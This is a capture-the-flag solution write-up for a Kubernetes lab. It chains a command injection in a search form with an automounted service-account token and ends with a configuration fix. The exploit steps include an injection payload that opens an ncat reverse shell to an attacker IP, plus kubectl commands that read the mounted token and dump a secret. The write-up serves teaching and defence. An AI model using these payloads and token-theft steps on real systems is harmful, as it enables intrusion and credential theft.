# Solution — 02 Automount Service Account Token

## Vulnerabilities

Two weaknesses chain together:

1. **Command injection** — the country search embeds user input directly into a shell command (`grep -i '<input>' /app/countries.csv`) via `shell=True` with no sanitisation. Closing the single quote and appending a semicolon allows arbitrary command execution.

2. **Automounted service account token** — `automountServiceAccountToken: true` causes Kubernetes to mount a valid API token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. The associated service account has a Role granting `get` and `list` on Secrets in the namespace.

## Exploit

### Step 1 — Open a reverse shell

Start a listener on your attacker machine (replace `9001` with any open port):

```sh
ncat -lvnp 9001
```

Submit the following payload in the country search form (replace `10.10.10.10` with your attacker IP):

```
' ; ncat 192.168.1.92 9001 -c 'bash -i' ; '
```

You now have a shell inside the container.

### Step 2 — Inspect kubectl

```sh
kubectl config view
```

The output shows a cluster (`in-cluster`) pointing at `https://kubernetes.default.svc` but no user credentials are set.

### Step 3 — Find the automounted token

```sh
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

### Step 4 — Use the token to list secrets

```sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token="$TOKEN" get secrets
```

The listing includes `02-automount-token-flag`.

### Step 5 — Read the flag

```sh
kubectl --token="$TOKEN" get secret 02-automount-token-flag -o jsonpath='{.data.flag}' | base64 -d
```

This prints the flag in the format `ctf{...}`.

## Fix

Set `automountServiceAccountToken: false` on the pod spec. If the application does not communicate with the Kubernetes API, the token should never be present in the container.

```yaml
spec:
  automountServiceAccountToken: false
```

Additionally, always adhere to the principle of least privilege by avoiding any permissions beyond those strictly necessary!
